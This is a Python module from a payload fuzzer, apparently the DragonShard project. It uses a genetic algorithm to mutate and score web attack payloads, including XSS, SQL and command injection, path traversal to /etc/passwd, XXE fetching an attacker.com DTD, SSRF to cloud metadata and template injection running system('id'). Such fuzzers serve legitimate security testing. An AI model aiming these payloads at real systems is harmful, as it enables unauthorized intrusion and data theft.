"""
DragonShard Genetic Algorithm Mutator Module

Uses genetic algorithms with domain-specific language awareness to intelligently mutate payloads.
"""

import json
import logging
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

from .prng import SecurePRNG, get_prng
from .response_analyzer import ResponseAnalysis, ResponseAnalyzer, ResponseDifferential

logger = logging.getLogger(__name__)


class PayloadType(Enum):
    """Types of payloads for domain-specific awareness."""

    XSS = "xss"
    SQL_INJECTION = "sqli"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    LFI = "lfi"
    RFI = "rfi"
    XXE = "xxe"
    SSRF = "ssrf"
    TEMPLATE_INJECTION = "template_injection"
    NOSQL_INJECTION = "no_sql_injection"


@dataclass
class GeneticPayload:
    """Represents a payload in the genetic algorithm."""

    payload: str
    payload_type: PayloadType
    fitness: float = 0.0
    mutation_count: int = 0
    generation: int = 0
    success_rate: float = 0.0
    vulnerability_score: float = 0.0
    response_analysis: Optional[ResponseAnalysis] = None
    differential_score: float = 0.0
    search_path_depth: int = 0
    dead_end_score: float = 0.0

    def __post_init__(self):
        """Initialize the payload with domain-specific parsing."""
        self.tokens = self._tokenize()
        self.syntax_tree = self._parse_syntax()

    def _tokenize(self) -> List[str]:
        """Tokenize the payload for analysis."""
        # Split by common delimiters while preserving structure
        tokens = re.split(r'([<>=&\'";\s()\[\]{}])', self.payload)
        return [token for token in tokens if token.strip()]

    def _parse_syntax(self) -> Dict[str, Any]:
        """Parse the payload into a syntax tree for domain-specific analysis."""
        tree = {
            "type": self.payload_type.value,
            "tokens": self.tokens,
            "structure": self._analyze_structure(),
            "keywords": self._extract_keywords(),
            "syntax_patterns": self._identify_syntax_patterns(),
        }
        return tree

    def _analyze_structure(self) -> Dict[str, Any]:
        """Analyze the structural components of the payload."""
        structure = {
            "has_tags": any("<" in token and ">" in token for token in self.tokens)
            or "<" in self.payload
            and ">" in self.payload,
            "has_quotes": any('"' in token or "'" in token for token in self.tokens)
            or '"' in self.payload
            or "'" in self.payload,
            "has_operators": any(op in self.payload for op in ["OR", "AND", "UNION", "SELECT"]),
            "has_functions": any(func in self.payload for func in ["alert", "eval", "exec"]),
            "has_paths": any("/" in token or "\\" in token for token in self.tokens)
            or "/" in self.payload
            or "\\" in self.payload,
            "has_encoding": any("%" in token for token in self.tokens) or "%" in self.payload,
        }
        return structure

    def _extract_keywords(self) -> List[str]:
        """Extract domain-specific keywords from the payload."""
        keywords = []

        if self.payload_type == PayloadType.XSS:
            xss_keywords = ["script", "alert", "javascript", "onload", "onerror", "eval"]
            keywords = [kw for kw in xss_keywords if kw.lower() in self.payload.lower()]

        elif self.payload_type == PayloadType.SQL_INJECTION:
            sql_keywords = ["select", "union", "or", "and", "drop", "insert", "update", "delete"]
            keywords = [kw for kw in sql_keywords if kw.lower() in self.payload.lower()]

        elif self.payload_type == PayloadType.COMMAND_INJECTION:
            cmd_keywords = ["ls", "cat", "whoami", "id", "pwd", "uname", "ping"]
            keywords = [kw for kw in cmd_keywords if kw.lower() in self.payload.lower()]

        return keywords

    def _identify_syntax_patterns(self) -> List[str]:
        """Identify syntax patterns in the payload."""
        patterns = []

        # HTML/XML patterns
        if re.search(r"<[^>]+>", self.payload):
            patterns.append("html_tag")

        # JavaScript patterns
        if re.search(r"javascript:", self.payload, re.IGNORECASE):
            patterns.append("javascript_protocol")

        # SQL patterns
        if re.search(r"\b(select|union|or|and)\b", self.payload, re.IGNORECASE):
            patterns.append("sql_keyword")

        # Path patterns
        if re.search(r"\.\./", self.payload):
            patterns.append("path_traversal")

        # Encoding patterns
        if re.search(r"%[0-9a-fA-F]{2}", self.payload):
            patterns.append("url_encoding")

        return patterns


class GeneticMutator:
    """Genetic algorithm for intelligent payload mutation with response analysis."""

    def __init__(
        self,
        population_size: int = 50,
        mutation_rate: float = 0.1,
        crossover_rate: float = 0.8,
        max_generations: int = 100,
        response_analyzer: Optional[ResponseAnalyzer] = None,
        target_url: Optional[str] = None,
    ):
        """Initialize the genetic mutator."""
        self.population_size = population_size
        self.mutation_rate = mutation_rate
        self.crossover_rate = crossover_rate
        self.max_generations = max_generations
        self.response_analyzer = response_analyzer
        self.target_url = target_url
        
        # Initialize secure PRNG for fuzzing operations
        self.prng = get_prng()
        
        # Population and evolution tracking
        self.population: List[GeneticPayload] = []
        self.generation = 0
        
        # Adaptive parameters
        self.adaptive_mutation = True
        self.diversity_threshold = 0.3
        self.convergence_threshold = 0.1
        self.min_mutation_rate = 0.05
        self.max_mutation_rate = 0.3
        
        # Search strategy tracking
        self.search_paths: Set[str] = set()
        self.dead_end_paths: Set[str] = set()
        self.successful_patterns: Dict[str, float] = {}
        self.baseline_responses: Dict[str, ResponseAnalysis] = {}
        self.mutation_success_rates: Dict[str, float] = {}
        
        # Load syntax patterns for domain-specific awareness
        self.syntax_patterns = self._load_syntax_patterns()
        
        logger.info(
            f"Initialized GeneticMutator with population_size={population_size}, "
            f"mutation_rate={mutation_rate}, crossover_rate={crossover_rate}"
        )

    def _load_syntax_patterns(self) -> Dict[PayloadType, Dict[str, Any]]:
        """Load domain-specific syntax patterns."""
        return {
            PayloadType.XSS: {
                "tags": ["<script>", "<img>", "<svg>", "<iframe>", "<body>"],
                "events": ["onload", "onerror", "onclick", "onfocus", "onchange"],
                "functions": ["alert", "confirm", "prompt", "eval", "fetch"],
                "protocols": ["javascript:", "data:", "vbscript:"],
            },
            PayloadType.SQL_INJECTION: {
                "keywords": ["SELECT", "UNION", "OR", "AND", "DROP", "INSERT"],
                "operators": ["=", "!=", "<>", "LIKE", "IN"],
                "comments": ["--", "#", "/*", "*/"],
                "functions": ["COUNT", "LENGTH", "SUBSTRING", "CONCAT"],
            },
            PayloadType.COMMAND_INJECTION: {
                "separators": [";", "|", "&&", "||", "`", "$()"],
                "commands": ["ls", "cat", "whoami", "id", "pwd", "uname"],
                "operators": ["&", "|", ">", "<", ">>", "<<"],
            },
            PayloadType.PATH_TRAVERSAL: {
                "sequences": ["../", "..\\", "....//", "..%2F"],
                "targets": ["/etc/passwd", "/etc/hosts", "C:\\windows\\system32"],
                "encodings": ["%2F", "%5C", "%c0%af", "%255c"],
            },
        }

    def initialize_population(self, base_payloads: List[str], payload_type: PayloadType) -> None:
        """
        Initialize the population with base payloads.

        Args:
            base_payloads: List of base payloads to start with
            payload_type: Type of payload for domain-specific awareness
        """
        self.population = []

        # Create initial population from base payloads
        for payload in base_payloads:
            genetic_payload = GeneticPayload(payload, payload_type)
            self.population.append(genetic_payload)

        # Fill remaining population with random mutations
        while len(self.population) < self.population_size:
            if self.population:
                parent = self.prng.choice(self.population)
                child = self._mutate_payload(parent)
                self.population.append(child)
            else:
                # Create a random payload if no base payloads
                random_payload = self._generate_random_payload(payload_type)
                genetic_payload = GeneticPayload(random_payload, payload_type)
                self.population.append(genetic_payload)

    def evolve(self, fitness_function) -> List[GeneticPayload]:
        """Evolve the population for one generation."""
        self.generation += 1
        
        # Calculate fitness for all individuals
        for payload in self.population:
            payload.fitness = fitness_function(payload)

        # Sort by fitness
        self.population.sort(key=lambda x: x.fitness, reverse=True)

        # Log progress
        if self.generation % 10 == 0:
            avg_fitness = sum(p.fitness for p in self.population) / len(self.population)
            logger.info(f"Generation {self.generation}: Avg fitness = {avg_fitness:.3f}")

        # Create new population
        new_population = []

        # Elitism: keep best 10% of population
        elite_count = max(1, self.population_size // 10)
        new_population.extend(self.population[:elite_count])

        # Generate rest of population through crossover and mutation
        while len(new_population) < self.population_size:
            if self.prng.random_float() < self.crossover_rate:
                # Crossover
                parent1 = self._select_parent()
                parent2 = self._select_parent()
                child = self._crossover(parent1, parent2)
                new_population.append(child)
            else:
                # Mutation
                parent = self._select_parent()
                child = self._mutate_payload(parent)
                new_population.append(child)

        self.population = new_population

        # Return current population (sorted by fitness)
        return sorted(self.population, key=lambda x: x.fitness, reverse=True)

    def _select_parent(self) -> GeneticPayload:
        """Select a parent using tournament selection."""
        tournament_size = 3
        tournament = self.prng.sample(self.population, tournament_size)
        return max(tournament, key=lambda x: x.fitness)

    def _tournament_selection(self, tournament_size: int = 3) -> GeneticPayload:
        """Tournament selection with configurable tournament size."""
        tournament = self.prng.sample(self.population, tournament_size)
        return max(tournament, key=lambda x: x.fitness)

    def _rank_based_selection(self) -> GeneticPayload:
        """Rank-based selection using linear ranking."""
        # Sort population by fitness
        sorted_population = sorted(self.population, key=lambda x: x.fitness, reverse=True)
        
        # Calculate rank probabilities (linear ranking)
        n = len(sorted_population)
        max_rank = n - 1
        min_rank = 0
        
        # Linear ranking parameters
        selection_pressure = 1.5  # Higher = more selective
        rank_probabilities = []
        
        for i, individual in enumerate(sorted_population):
            rank = i
            probability = (2 - selection_pressure) / n + 2 * rank * (selection_pressure - 1) / (n * (n - 1))
            rank_probabilities.append((individual, probability))
        
        # Select based on rank probabilities
        total_prob = sum(prob for _, prob in rank_probabilities)
        r = self.prng.random_float() * total_prob
        cumulative_prob = 0
        
        for individual, prob in rank_probabilities:
            cumulative_prob += prob
            if cumulative_prob >= r:
                return individual
        
        return sorted_population[0]  # Fallback

    def _fitness_proportionate_selection(self) -> GeneticPayload:
        """Fitness-proportionate selection (roulette wheel)."""
        # Calculate fitness sum
        total_fitness = sum(p.fitness for p in self.population)
        
        if total_fitness == 0:
            return self.prng.choice(self.population)
        
        # Calculate selection probabilities
        probabilities = [p.fitness / total_fitness for p in self.population]
        
        # Roulette wheel selection
        r = self.prng.random_float()
        cumulative_prob = 0
        
        for i, prob in enumerate(probabilities):
            cumulative_prob += prob
            if cumulative_prob >= r:
                return self.population[i]
        
        return self.population[0]  # Fallback

    def _elitism_selection(self, elite_size: int = 2) -> List[GeneticPayload]:
        """Elitism selection - preserve best individuals."""
        sorted_population = sorted(self.population, key=lambda x: x.fitness, reverse=True)
        return sorted_population[:elite_size]

    def _crossover(self, parent1: GeneticPayload, parent2: GeneticPayload) -> GeneticPayload:
        """Perform crossover between two parents."""
        # Domain-aware crossover
        if parent1.payload_type != parent2.payload_type:
            # If different types, prefer the better parent
            better_parent = parent1 if parent1.fitness > parent2.fitness else parent2
            return self._mutate_payload(better_parent)

        # Same type crossover
        if parent1.payload_type == PayloadType.XSS:
            return self._crossover_xss(parent1, parent2)
        elif parent1.payload_type == PayloadType.SQL_INJECTION:
            return self._crossover_sql(parent1, parent2)
        else:
            return self._crossover_general(parent1, parent2)

    def _crossover_xss(self, parent1: GeneticPayload, parent2: GeneticPayload) -> GeneticPayload:
        """Crossover for XSS payloads."""
        # Extract components
        p1_tags = [t for t in parent1.tokens if "<" in t and ">" in t]
        p1_events = [t for t in parent1.tokens if "on" in t.lower()]
        p1_functions = [
            t for t in parent1.tokens if any(f in t.lower() for f in ["alert", "eval", "fetch"])
        ]

        p2_tags = [t for t in parent2.tokens if "<" in t and ">" in t]
        p2_events = [t for t in parent2.tokens if "on" in t.lower()]
        p2_functions = [
            t for t in parent2.tokens if any(f in t.lower() for f in ["alert", "eval", "fetch"])
        ]

        # Combine components
        new_tags = p1_tags if self.prng.random_float() < 0.5 else p2_tags
        new_events = p1_events if self.prng.random_float() < 0.5 else p2_events
        new_functions = p1_functions if self.prng.random_float() < 0.5 else p2_functions

        # Construct new payload
        if new_tags and new_events:
            new_payload = f"{new_tags[0]} {new_events[0]}={new_functions[0] if new_functions else 'alert(1)'}>"
        elif new_tags:
            new_payload = f"{new_tags[0]} onload=alert(1)>"
        else:
            new_payload = "<script>alert(1)</script>"

        # Ensure payload is different from parents
        if new_payload == parent1.payload or new_payload == parent2.payload:
            new_payload = f"{new_payload} crossed"

        return GeneticPayload(new_payload, parent1.payload_type, generation=self.generation)

    def _crossover_sql(self, parent1: GeneticPayload, parent2: GeneticPayload) -> GeneticPayload:
        """Crossover for SQL injection payloads."""
        # Extract SQL components
        p1_keywords = [
            t
            for t in parent1.tokens
            if any(kw in t.upper() for kw in ["SELECT", "UNION", "OR", "AND"])
        ]
        p1_operators = [t for t in parent1.tokens if t in ["=", "!=", "<>", "LIKE"]]
        p1_comments = [t for t in parent1.tokens if t in ["--", "#", "/*"]]

        p2_keywords = [
            t
            for t in parent2.tokens
            if any(kw in t.upper() for kw in ["SELECT", "UNION", "OR", "AND"])
        ]
        p2_operators = [t for t in parent2.tokens if t in ["=", "!=", "<>", "LIKE"]]
        p2_comments = [t for t in parent2.tokens if t in ["--", "#", "/*"]]

        # Combine components
        new_keywords = p1_keywords if self.prng.random_float() < 0.5 else p2_keywords
        new_operators = p1_operators if self.prng.random_float() < 0.5 else p2_operators
        new_comments = p1_comments if self.prng.random_float() < 0.5 else p2_comments

        # Construct new payload
        if new_keywords:
            new_payload = (
                f"'{' '.join(new_keywords)} {new_operators[0] if new_operators else '='} 1"
            )
            if new_comments:
                new_payload += f" {new_comments[0]}"
        else:
            new_payload = "' OR 1=1--"

        return GeneticPayload(new_payload, parent1.payload_type, generation=self.generation)

    def _crossover_general(
        self, parent1: GeneticPayload, parent2: GeneticPayload
    ) -> GeneticPayload:
        """General crossover for other payload types."""
        # Simple string crossover
        if len(parent1.payload) > 3 and len(parent2.payload) > 3:
            crossover_point = self.prng.randint(
                1, min(len(parent1.payload), len(parent2.payload)) - 1
            )
            new_payload = parent1.payload[:crossover_point] + parent2.payload[crossover_point:]
        else:
            new_payload = parent1.payload if self.prng.random_float() < 0.5 else parent2.payload

        return GeneticPayload(new_payload, parent1.payload_type, generation=self.generation)

    def _mutate_payload(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate a payload using domain-specific operators."""
        if self.prng.random_float() > self.mutation_rate:
            return payload

        # Use domain-specific mutation based on payload type
        if payload.payload_type == PayloadType.XSS:
            mutated_payload = self._mutate_xss(payload)
        elif payload.payload_type == PayloadType.SQL_INJECTION:
            mutated_payload = self._mutate_sql(payload)
        elif payload.payload_type == PayloadType.COMMAND_INJECTION:
            mutated_payload = self._mutate_command(payload)
        elif payload.payload_type == PayloadType.PATH_TRAVERSAL:
            mutated_payload = self._mutate_path(payload)
        elif payload.payload_type == PayloadType.LFI:
            mutated_payload = self._mutate_lfi(payload)
        elif payload.payload_type == PayloadType.RFI:
            mutated_payload = self._mutate_rfi(payload)
        elif payload.payload_type == PayloadType.XXE:
            mutated_payload = self._mutate_xxe(payload)
        elif payload.payload_type == PayloadType.SSRF:
            mutated_payload = self._mutate_ssrf(payload)
        elif payload.payload_type == PayloadType.TEMPLATE_INJECTION:
            mutated_payload = self._mutate_template(payload)
        elif payload.payload_type == PayloadType.NOSQL_INJECTION:
            mutated_payload = self._mutate_nosql(payload)
        else:
            mutated_payload = self._mutate_general(payload)

        mutated_payload.mutation_count = payload.mutation_count + 1
        mutated_payload.generation = self.generation
        return mutated_payload

    def _mutate_xss(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate XSS payload with domain awareness."""
        patterns = self.syntax_patterns[PayloadType.XSS]

        mutations = [
            # Tag mutations
            lambda p: p.replace("<script>", self.prng.choice(patterns["tags"])),
            lambda p: p.replace("alert", self.prng.choice(patterns["functions"])),
            lambda p: p.replace("onload", self.prng.choice(patterns["events"])),
            # Add encoding
            lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
            lambda p: p.replace("javascript:", "javascript&#58;"),
            # Add quotes
            lambda p: p.replace("alert(1)", 'alert("XSS")'),
            # Add protocol
            lambda p: f"javascript:{p}" if not p.startswith("javascript:") else p,
        ]

        mutation = self.prng.choice(mutations)
        new_payload = mutation(payload.payload)

        # Ensure payload actually changed
        if new_payload == payload.payload:
            new_payload = f"{new_payload} mutated"

        result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
        result.mutation_count = payload.mutation_count + 1
        return result

    def _mutate_sql(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate SQL injection payload with domain awareness."""
        patterns = self.syntax_patterns[PayloadType.SQL_INJECTION]

        mutations = [
            # Keyword mutations
            lambda p: p.replace("OR", self.prng.choice(patterns["keywords"])),
            lambda p: p.replace("=", self.prng.choice(patterns["operators"])),
            lambda p: p.replace("--", self.prng.choice(patterns["comments"])),
            # Add quotes
            lambda p: f"'{p}" if not p.startswith("'") else p,
            lambda p: f"{p}'" if not p.endswith("'") else p,
            # Add functions
            lambda p: f"UNION SELECT {self.prng.choice(patterns['functions'])}(1)",
            # Add encoding
            lambda p: p.replace("'", "&#39;"),
            # Add spaces
            lambda p: p.replace("OR", " OR ").replace("AND", " AND "),
        ]

        mutation = self.prng.choice(mutations)
        new_payload = mutation(payload.payload)

        # Ensure payload actually changed
        if new_payload == payload.payload:
            new_payload = f"{new_payload} mutated"

        result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
        result.mutation_count = payload.mutation_count + 1
        return result

    def _mutate_command(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate command injection payload with domain awareness."""
        patterns = self.syntax_patterns[PayloadType.COMMAND_INJECTION]

        mutations = [
            # Separator mutations
            lambda p: p.replace(";", self.prng.choice(patterns["separators"])),
            # Command mutations
            lambda p: p.replace("ls", self.prng.choice(patterns["commands"])),
            # Add operators
            lambda p: f"{p} | grep root",
            lambda p: f"{p} > /tmp/output",
            # Add encoding
            lambda p: p.replace(";", "%3B"),
            # Add quotes
            lambda p: f"`{p}`" if not p.startswith("`") else p,
        ]

        mutation = self.prng.choice(mutations)
        new_payload = mutation(payload.payload)

        # Ensure payload actually changed
        if new_payload == payload.payload:
            new_payload = f"{new_payload} mutated"

        result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
        result.mutation_count = payload.mutation_count + 1
        return result

    def _mutate_path(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate path traversal payload with domain awareness."""
        patterns = self.syntax_patterns[PayloadType.PATH_TRAVERSAL]

        mutations = [
            # Sequence mutations
            lambda p: p.replace("../", self.prng.choice(patterns["sequences"])),
            # Target mutations
            lambda p: p.replace("/etc/passwd", self.prng.choice(patterns["targets"])),
            # Encoding mutations
            lambda p: p.replace("/", "%2F").replace("\\", "%5C"),
            # Add more traversal
            lambda p: f"../../../{p}" if not p.startswith("../") else p,
            # Add null bytes
            lambda p: f"{p}%00",
            # Add double encoding
            lambda p: p.replace("%2F", "%252F"),
        ]

        mutation = self.prng.choice(mutations)
        new_payload = mutation(payload.payload)

        # Ensure payload actually changed
        if new_payload == payload.payload:
            new_payload = f"{new_payload} mutated"

        result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
        result.mutation_count = payload.mutation_count + 1
        return result

    def _mutate_lfi(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate LFI payload with domain awareness."""
        mutations = [
            # Add more traversal
            lambda p: f"../../../{p}" if not p.startswith("../") else p,
            # Add encoding
            lambda p: p.replace("/", "%2F"),
            # Add null bytes
            lambda p: f"{p}%00",
            # Add different targets
            lambda p: p.replace("/etc/passwd", "/etc/hosts"),
            lambda p: p.replace("/etc/passwd", "/proc/version"),
            # Add double encoding
            lambda p: p.replace("%2F", "%252F"),
        ]

        mutation = self.prng.choice(mutations)
        new_payload = mutation(payload.payload)

        return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)

    def _mutate_rfi(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate RFI payload with domain awareness."""
        mutations = [
            # Add different protocols
            lambda p: p.replace("http://", "https://"),
            lambda p: p.replace("http://", "ftp://"),
            # Add encoding
            lambda p: p.replace("://", "%3A//"),
            # Add different file extensions
            lambda p: p.replace(".php", ".jsp"),
            lambda p: p.replace(".php", ".asp"),
            # Add parameters
            lambda p: f"{p}?param=test",
            # Add different domains
            lambda p: p.replace("attacker.com", "evil.com"),
        ]

        mutation = self.prng.choice(mutations)
        new_payload = mutation(payload.payload)

        return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)

    def _mutate_xxe(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate XXE payload with domain awareness."""
        mutations = [
            # Add different entities
            lambda p: p.replace("file:///etc/passwd", "file:///etc/hosts"),
            # Add external entities
            lambda p: p.replace("file:///etc/passwd", "http://attacker.com/evil.dtd"),
            # Add parameter entities
            lambda p: p.replace("<!ENTITY xxe", "<!ENTITY % xxe"),
            # Add different encodings
            lambda p: p.replace("<?xml", '<?xml version="1.0" encoding="UTF-8"?>'),
            # Add different DOCTYPE
            lambda p: p.replace("<!DOCTYPE foo", "<!DOCTYPE data"),
        ]

        mutation = self.prng.choice(mutations)
        new_payload = mutation(payload.payload)

        return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)

    def _mutate_ssrf(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate SSRF payload with domain awareness."""
        mutations = [
            # Add different ports
            lambda p: p.replace("127.0.0.1", "127.0.0.1:8080"),
            # Add different protocols
            lambda p: p.replace("http://", "https://"),
            # Add different IPs
            lambda p: p.replace("127.0.0.1", "0.0.0.0"),
            # Add cloud metadata
            lambda p: p.replace("127.0.0.1", "169.254.169.254/latest/meta-data/"),
            # Add different paths
            lambda p: f"{p}/admin",
            lambda p: f"{p}/api",
        ]

        mutation = self.prng.choice(mutations)
        new_payload = mutation(payload.payload)

        return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)

    def _mutate_template(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate template injection payload with domain awareness."""
        mutations = [
            # Add different template syntax
            lambda p: p.replace("{{7*7}}", "${7*7}"),
            lambda p: p.replace("{{7*7}}", "#{7*7}"),
            # Add different expressions
            lambda p: p.replace("7*7", "config"),
            lambda p: p.replace("7*7", "system('id')"),
            # Add different delimiters
            lambda p: p.replace("{{", "<%=").replace("}}", "%>"),
            # Add different functions
            lambda p: p.replace("7*7", "request.environment"),
        ]

        mutation = self.prng.choice(mutations)
        new_payload = mutation(payload.payload)

        return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)

    def _mutate_nosql(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate NoSQL injection payload with domain awareness."""
        mutations = [
            # Add different operators
            lambda p: p.replace("||", "&&"),
            lambda p: p.replace("||", "|"),
            # Add different values
            lambda p: p.replace("1==1", "true"),
            lambda p: p.replace("1==1", "1"),
            # Add different syntax
            lambda p: p.replace("||", "||"),
            lambda p: p.replace("||", "||"),
            # Add different fields
            lambda p: p.replace("||", "|| this.username=='admin"),
            # Add different quotes
            lambda p: p.replace("'", '"'),
        ]

        mutation = self.prng.choice(mutations)
        new_payload = mutation(payload.payload)

        return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)

    def _mutate_general(self, payload: GeneticPayload) -> GeneticPayload:
        """General mutation for unknown payload types."""
        mutations = [
            # Character mutations
            lambda p: p.replace("a", "A").replace("e", "E"),
            lambda p: p.replace("1", "2").replace("0", "1"),
            # Add encoding
            lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
            # Add quotes
            lambda p: f'"{p}"' if not p.startswith('"') else p,
            # Add spaces
            lambda p: p.replace("=", " = ").replace("'", " ' "),
            # Reverse case
            lambda p: p.swapcase(),
            # Add random characters
            lambda p: p + self.prng.choice("abcdefghijklmnopqrstuvwxyz"),
        ]

        mutation = self.prng.choice(mutations)
        new_payload = mutation(payload.payload)

        # Ensure payload actually changed
        if new_payload == payload.payload:
            new_payload = f"{new_payload} mutated"

        result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
        result.mutation_count = payload.mutation_count + 1
        return result

    def _generate_random_payload(self, payload_type: PayloadType) -> str:
        """Generate a random payload for the given type."""
        if payload_type == PayloadType.XSS:
            return "<script>alert(1)</script>"
        elif payload_type == PayloadType.SQL_INJECTION:
            return "' OR 1=1--"
        elif payload_type == PayloadType.COMMAND_INJECTION:
            return "; ls -la"
        elif payload_type == PayloadType.PATH_TRAVERSAL:
            return "../../../etc/passwd"
        else:
            return "test"

    def get_best_payloads(self, count: int = 10) -> List[GeneticPayload]:
        """Get the best payloads from the current population."""
        if not self.population:
            return []
        return sorted(self.population, key=lambda x: x.fitness, reverse=True)[:count]

    def export_evolution_data(self, filename: str) -> None:
        """Export evolution data for analysis."""
        data = {
            "generations": self.generation,
            "population_size": self.population_size,
            "mutation_rate": self.mutation_rate,
            "crossover_rate": self.crossover_rate,
            "best_payloads": [
                {
                    "payload": p.payload,
                    "type": p.payload_type.value,
                    "fitness": p.fitness,
                    "generation": p.generation,
                    "mutation_count": p.mutation_count,
                    "differential_score": p.differential_score,
                    "search_path_depth": p.search_path_depth,
                    "dead_end_score": p.dead_end_score,
                }
                for p in self.get_best_payloads(20)
            ],
            "search_statistics": {
                "total_paths": len(self.search_paths),
                "dead_end_paths": len(self.dead_end_paths),
                "successful_patterns": {
                    k.value: len(v) for k, v in self.successful_patterns.items()
                },
                "mutation_success_rates": self.mutation_success_rates,
            },
        }

        with open(filename, "w") as f:
            json.dump(data, f, indent=2)

        logger.info(f"Evolution data exported to {filename}")

    def set_baseline_response(self, url: str, response_analysis: ResponseAnalysis) -> None:
        """Set a baseline response for differential analysis."""
        self.baseline_responses[url] = response_analysis
        self.response_analyzer.set_baseline(url, response_analysis)
        logger.info(f"Set baseline response for {url}")

    def update_payload_with_response(
        self,
        payload: GeneticPayload,
        response_analysis: ResponseAnalysis,
        baseline_response: Optional[ResponseAnalysis] = None,
    ) -> None:
        """Update payload with response analysis and calculate differential score."""
        payload.response_analysis = response_analysis

        # Calculate differential score if baseline exists
        if baseline_response:
            differential = self.response_analyzer.compare_responses(
                baseline_response, response_analysis
            )
            payload.differential_score = differential.reward_score

            # Update search path tracking
            self._update_search_path(payload, differential)

            # Update mutation success rates
            self._update_mutation_success_rates(payload, differential)

        # Add to response history
        self.response_analyzer.add_to_history(response_analysis)

    def _update_search_path(
        self, payload: GeneticPayload, differential: ResponseDifferential
    ) -> None:
        """Update search path tracking for intelligent exploration."""
        path_key = f"{payload.payload_type.value}_{payload.search_path_depth}"

        if path_key not in self.search_paths:
            self.search_paths.add(path_key)

        # Check for dead end (no differential indicators)
        if not differential.differential_indicators:
            payload.dead_end_score += 0.1
            if payload.dead_end_score > 0.5:
                self.dead_end_paths.add(path_key)

        # Track successful patterns
        if differential.reward_score > 0.7:
            if payload.payload_type.value not in self.successful_patterns:
                self.successful_patterns[payload.payload_type.value] = 0.0
            self.successful_patterns[payload.payload_type.value] += 1

    def _update_mutation_success_rates(
        self, payload: GeneticPayload, differential: ResponseDifferential
    ) -> None:
        """Update mutation success rates based on response analysis."""
        if payload.mutation_count > 0:
            # Determine mutation type based on payload characteristics
            mutation_type = self._classify_mutation_type(payload)

            # Update success rate based on differential score
            if differential.reward_score > 0.5:
                self.mutation_success_rates[mutation_type] = min(
                    1.0, self.mutation_success_rates.get(mutation_type, 0.0) + 0.1
                )
            else:
                self.mutation_success_rates[mutation_type] = max(
                    0.0, self.mutation_success_rates.get(mutation_type, 0.0) - 0.05
                )

    def _classify_mutation_type(self, payload: GeneticPayload) -> str:
        """Classify the type of mutation applied to a payload."""
        if payload.payload_type == PayloadType.XSS:
            if any(encoding in payload.payload for encoding in ["&lt;", "&gt;", "%3C", "%3E"]):
                return "encoding"
            elif "<" in payload.payload and ">" in payload.payload:
                return "tag"
            else:
                return "general"
        elif payload.payload_type == PayloadType.SQL_INJECTION:
            if any(op in payload.payload.upper() for op in ["UNION", "SELECT", "OR", "AND"]):
                return "tag"
            else:
                return "general"
        else:
            return "general"

    def create_response_based_fitness(
        self, target_url: str, baseline_response: Optional[ResponseAnalysis] = None
    ) -> Callable:
        """Create a response-based fitness function."""

        def fitness_function(payload: GeneticPayload) -> float:
            # If we have response analysis, use it
            if payload.response_analysis:
                if baseline_response:
                    differential = self.response_analyzer.compare_responses(
                        baseline_response, payload.response_analysis
                    )
                    return differential.reward_score
                else:
                    return payload.response_analysis.anomaly_score

            # Fallback to heuristic-based fitness
            return self._heuristic_fitness(payload)

        return fitness_function

    def _heuristic_fitness(self, payload: GeneticPayload) -> float:
        """Heuristic-based fitness function as fallback."""
        score = 0.0

        # Reward for domain-specific indicators
        if payload.payload_type == PayloadType.XSS:
            if any(
                indicator in payload.payload.lower()
                for indicator in ["script", "alert", "javascript"]
            ):
                score += 0.5
            if any(encoding in payload.payload for encoding in ["&lt;", "&gt;", "%3C", "%3E"]):
                score += 0.3
            if any(event in payload.payload.lower() for event in ["onload", "onerror", "onclick"]):
                score += 0.4

        elif payload.payload_type == PayloadType.SQL_INJECTION:
            if any(
                keyword in payload.payload.upper() for keyword in ["SELECT", "UNION", "OR", "AND"]
            ):
                score += 0.6
            if any(comment in payload.payload for comment in ["--", "#", "/*"]):
                score += 0.3

        elif payload.payload_type == PayloadType.COMMAND_INJECTION:
            if any(separator in payload.payload for separator in [";", "|", "&&", "||"]):
                score += 0.5
            if any(command in payload.payload.lower() for command in ["ls", "cat", "whoami"]):
                score += 0.4

        # Penalty for length (prefer shorter payloads)
        score -= len(payload.payload) * 0.01

        # Penalty for dead end paths
        score -= payload.dead_end_score

        return max(0.0, score)

    def intelligent_mutation_selection(self, payload: GeneticPayload) -> Callable:
        """Select mutation based on historical success and search strategy."""
        # Avoid dead end paths
        path_key = f"{payload.payload_type.value}_{payload.search_path_depth}"
        if path_key in self.dead_end_paths:
            # Try different mutation type
            return self._select_alternative_mutation(payload)

        # Use weighted selection based on success rates
        return self._weighted_mutation_selection(payload)

    def _weighted_mutation_selection(self, payload: GeneticPayload) -> Callable:
        """Select mutation using weighted random selection."""
        mutation_types = list(self.mutation_success_rates.keys())
        weights = [self.mutation_success_rates[mt] for mt in mutation_types]

        # Normalize weights
        total_weight = sum(weights)
        if total_weight > 0:
            weights = [w / total_weight for w in weights]
        else:
            weights = [1.0 / len(mutation_types)] * len(mutation_types)

        # Select mutation type
        selected_type = self.prng.choices(mutation_types, weights=weights)[0]

        # Map to actual mutation function
        if payload.payload_type == PayloadType.XSS:
            return self._mutate_xss
